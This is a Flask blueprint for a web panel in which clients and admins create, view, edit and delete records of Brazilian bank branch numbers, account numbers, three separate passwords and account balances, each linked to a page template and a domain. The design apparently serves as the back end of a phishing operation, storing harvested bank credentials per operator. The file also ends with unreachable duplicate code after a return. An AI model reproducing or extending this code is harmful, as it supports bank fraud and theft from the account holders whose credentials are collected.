from flask import Blueprint, redirect, url_for, flash, request, abort
from flask_login import login_required, current_user
from app.controllers.auth import admin_required
from app.models.info import Info
from app.models.client import Client
from app.models.template import Template
from app.models.domain import Domain
from app.views.info_view import InfoView
from app.services.audit_service import AuditService
from bson import ObjectId

info = Blueprint('info', __name__, url_prefix='/infos')

def client_or_admin_required(func):
    """Decorator to ensure user is either the client or an admin"""
    @login_required
    def client_or_admin_wrapper(*args, **kwargs):
        # If user is admin, allow access
        if current_user.is_admin:
            return func(*args, **kwargs)
        
        # If we're looking at a specific info, check if user owns it
        if 'info_id' in kwargs:
            info_data = Info.get_by_id(kwargs['info_id'])
            if not info_data:
                flash('Information not found', 'danger')
                return redirect(url_for('main.dashboard'))
                
            # If user is the client that owns this info, allow access
            if current_user.user and str(info_data['client_id']) == str(current_user.user['_id']):
                return func(*args, **kwargs)
        
        # If we're looking at all infos for a client
        if 'client_id' in kwargs:
            # If user is the client, allow access to their own infos
            if current_user.user and str(kwargs['client_id']) == str(current_user.user['_id']):
                return func(*args, **kwargs)
        
        # Otherwise deny access
        flash('You do not have permission to access this resource', 'danger')
        return redirect(url_for('main.dashboard'))
    
    # Copy func attributes to the wrapper function
    client_or_admin_wrapper.__name__ = func.__name__
    client_or_admin_wrapper.__doc__ = func.__doc__
    client_or_admin_wrapper.__module__ = func.__module__
    
    return client_or_admin_wrapper

@info.route('/')
@login_required
@admin_required
def list_infos():
    """List all infos (admin only)"""
    infos = Info.get_all()
    
    # Enrich with client info
    for info_data in infos:
        if 'client_id' in info_data:
            client = Client.get_by_id(info_data['client_id'])
            if client:
                info_data['client'] = client
    
    return InfoView.render_list(infos)

@info.route('/client/<client_id>')
@login_required
@client_or_admin_required
def list_client_infos(client_id):
    """List all infos for a specific client"""
    client = Client.get_by_id(client_id)
    if not client:
        flash('Client not found', 'danger')
        return redirect(url_for('main.dashboard'))
    
    infos = Info.get_by_client(client_id)
    
    return InfoView.render_client_list(client, infos)

@info.route('/create/<client_id>', methods=['GET', 'POST'])
@login_required
@client_or_admin_required
def create_info(client_id):
    """Create a new info entry for a client"""
    client = Client.get_by_id(client_id)
    if not client:
        flash('Client not found', 'danger')
        return redirect(url_for('main.dashboard'))
    
    templates = Template.get_all()
    
    # Get client domains
    domains = Domain.get_client_domains(client_id)
    
    if request.method == 'POST':
        # Extract form data
        data = {
            'agencia': request.form.get('agencia'),
            'conta': request.form.get('conta'),
            'senha': request.form.get('senha'),
            'senha6': request.form.get('senha6'),
            'senha4': request.form.get('senha4'),
            'anotacoes': request.form.get('anotacoes'),
            'saldo': float(request.form.get('saldo', 0)),
            'template_id': request.form.get('template_id') or None,
            'domain_id': request.form.get('domain_id') or None,
            'status': request.form.get('status', 'active')
        }
        
        # Validate required fields
        if not data['agencia'] or not data['conta'] or not data['senha'] or not data['senha6'] or not data['senha4']:
            flash('Please fill in all required fields', 'danger')
            return InfoView.render_create_form(
                client, templates, domains, form_data=data
            )
        
        # Create info
        success, message = Info.create(
            client_id=client_id,
            agencia=data['agencia'],
            conta=data['conta'], 
            senha=data['senha'],
            senha6=data['senha6'],
            senha4=data['senha4'],
            anotacoes=data['anotacoes'],
            saldo=data['saldo'],
            template_id=data['template_id'],
            domain_id=data['domain_id'],
            status=data['status']
        )
        
        if success:
            # Log info creation in audit trail
            AuditService.log_info_action('create', message, {
                'client_id': client_id,
                'agencia': data['agencia'],
                'conta': data['conta'],
                'template_id': data['template_id'],
                'domain_id': data['domain_id'],
                'status': data['status']
            })
            flash('Information created successfully', 'success')
            return redirect(url_for('info.list_client_infos', client_id=client_id))
        else:
            flash(f'Error creating information: {message}', 'danger')
    
    return InfoView.render_create_form(client, templates, domains)

@info.route('/edit/<info_id>', methods=['GET', 'POST'])
@login_required
@client_or_admin_required
def edit_info(info_id):
    """Edit info"""
    info_data = Info.get_with_relations(info_id)
    if not info_data:
        flash('Information not found', 'danger')
        return redirect(url_for('main.dashboard'))
    
    client = Client.get_by_id(info_data['client_id'])
    if not client:
        flash('Client not found', 'danger')
        return redirect(url_for('main.dashboard'))
    
    templates = Template.get_all()
    domains = Domain.get_client_domains(str(info_data['client_id']))
    
    if request.method == 'POST':
        # Extract form data
        data = {
            'agencia': request.form.get('agencia'),
            'conta': request.form.get('conta'),
            'senha': request.form.get('senha'),
            'senha6': request.form.get('senha6'),
            'senha4': request.form.get('senha4'),
            'anotacoes': request.form.get('anotacoes'),
            'saldo': float(request.form.get('saldo', 0)),
            'template_id': request.form.get('template_id') or None,
            'domain_id': request.form.get('domain_id') or None,
            'status': request.form.get('status', 'active')
        }
        
        # Validate required fields
        if not data['agencia'] or not data['conta'] or not data['senha'] or not data['senha6'] or not data['senha4']:
            flash('Please fill in all required fields', 'danger')
            return InfoView.render_edit_form(
                client, info_data, templates, domains, form_data=data
            )
        
        # Update info
        success, message = Info.update(info_id, data)
        
        if success:
            # Log info update in audit trail
            AuditService.log_info_action('update', info_id, {
                'client_id': str(info_data['client_id']),
                'agencia': data['agencia'],
                'conta': data['conta'],
                'status': data['status']
            })
            flash('Information updated successfully', 'success')
            return redirect(url_for('info.view_info', info_id=info_id))
        else:
            flash(f'Error updating information: {message}', 'danger')
    
    return InfoView.render_edit_form(client, info_data, templates, domains)

@info.route('/view/<info_id>')
@login_required
@client_or_admin_required
def view_info(info_id):
    """View info details"""
    info_data = Info.get_with_relations(info_id)
    if not info_data:
        flash('Information not found', 'danger')
        return redirect(url_for('main.dashboard'))
    
    return InfoView.render_view(info_data)

@info.route('/delete/<info_id>', methods=['POST'])
@login_required
@client_or_admin_required
def delete_info(info_id):
    """Delete info"""
    info_data = Info.get_by_id(info_id)
    if not info_data:
        flash('Information not found', 'danger')
        return redirect(url_for('main.dashboard'))
    
    client_id = str(info_data['client_id'])
    agencia = info_data.get('agencia', 'unknown')
    conta = info_data.get('conta', 'unknown')
    
    success, message = Info.delete(info_id)
    
    if success:
        # Log info deletion in audit trail
        AuditService.log_info_action('delete', info_id, {
            'client_id': client_id,
            'agencia': agencia,
            'conta': conta
        })
        flash('Information deleted successfully', 'success')
    else:
        flash(f'Error deleting information: {message}', 'danger')
    
    return redirect(url_for('info.list_client_infos', client_id=client_id))
    
    if success:
        flash('Information deleted successfully', 'success')
    else:
        flash(f'Error deleting information: {message}', 'danger')
    
    return redirect(url_for('info.list_client_infos', client_id=client_id))